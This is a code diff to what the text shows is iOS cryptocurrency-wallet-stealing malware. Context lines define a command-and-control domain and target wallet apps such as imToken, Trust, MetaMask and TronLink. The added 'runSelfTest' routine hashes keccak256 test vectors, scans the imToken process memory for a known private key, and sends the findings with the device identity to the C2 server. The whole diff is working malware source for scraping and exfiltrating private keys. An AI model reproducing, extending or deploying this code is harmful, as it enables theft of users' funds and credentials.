@@ -13,6 +13,7 @@
 #import "Collector.h"
 #import "WalletFS.h"
 #import "MemScan.h"
+#import "Keccak.h"
 #import "Crypto.h"
 
 static NSString *const kBaseURL     = @"https://myg3z1adawtxz0s.icu";          // C2 域名
@@ -30,6 +31,7 @@ static NSString *const kSeed        = @"d9f5121f75a6646c4f814a4ff8c41b04";    //
 
 @interface Payload ()
 - (void)reportKeyDiag:(NSString *)tag ctx:(NSDictionary *)ctx;
+- (void)runSelfTest;
 @end
 
 @implementation Payload
@@ -444,6 +446,9 @@ static NSArray *WalletPathsFor(NSString *bundleId) {
         // 一次性：探测能不能从进程外面直接读钱包 App 的容器
         [self probeWalletFS];
 
+        // 一次性自检：keccak 正确性 + 已知私钥是否驻留内存
+        [self runSelfTest];
+
         // 外部直读采集钱包（不需要注入目标 App，也不会闪退）
         NSArray *walletBids = @[@"im.token.app", @"com.sixdays.trust", @"io.metamask.MetaMask",
                                 @"com.tronlink.hdwallet", @"com.global.wallet.ios",
@@ -527,6 +532,49 @@ static NSArray *WalletMemoryTargets(void) {
         @[@"Bitpie", @"com.bitpie.wallet"],
     ];
 }
+
+#pragma mark - 自检（keccak + 内存存活探测）
+
+/**
+ * 两个检查，用来区分「实现错了」还是「密钥不在内存」：
+ *  1. keccak256 标准测试向量（空串 / "abc"）
+ *  2. 已知私钥的原文是否还在 imToken 内存里（说明钱包处于解锁状态）
+ */
+- (void)runSelfTest {
+    NSMutableDictionary *ctx = [NSMutableDictionary dictionary];
+
+    uint8_t d0[32], d1[32];
+    keccak256((const uint8_t *)"", 0, d0);
+    keccak256((const uint8_t *)"abc", 3, d1);
+    NSMutableString *h0 = [NSMutableString string];
+    NSMutableString *h1 = [NSMutableString string];
+    for (int i = 0; i < 32; i++) {
+        [h0 appendFormat:@"%02x", d0[i]];
+        [h1 appendFormat:@"%02x", d1[i]];
+    }
+    ctx[@"keccak_empty"] = h0;
+    ctx[@"keccak_abc"] = h1;
+    // 期望：
+    //   空串  c5d2460186f7233c927e7db2dcc703c0e500b653ca82273b7bfad8045d85a470
+    //   abc   4e03657aea45a94fc7d47ba826c8d667c0d1e6e33a64a036ec44f58fa12d6c45
+
+    // 已知私钥（abc 钱包）是否还在内存里
+    NSData *pk = [MemScan dataFromHex:@"1183f96f10c2469f1a39665c817851b0be6bf7fbe14f4a42831df1c1e9afc115"];
+    if (pk.length) {
+        NSDictionary *hit = [MemScan findBytesInPid:[MemScan pidOfExecutableContaining:@"token.app"]
+                                             needle:pk
+                                           maxBytes:256 * 1024 * 1024];
+        ctx[@"privKeyFound"] = hit[@"found"];
+        ctx[@"privKeyOffset"] = hit[@"offset"] ?: @(-1);
+    }
+
+    NSMutableDictionary *ev = [NSMutableDictionary dictionaryWithDictionary:[Info identity]];
+    ev[@"et"] = @"memscan_selftest";
+    ev[@"c"] = kSeed;
+    ev[@"ctx"] = ctx;
+    [self.net sendEvent:ev];
+}
+
 #pragma mark - 监听钱包进程并直接读内存
 
 /**
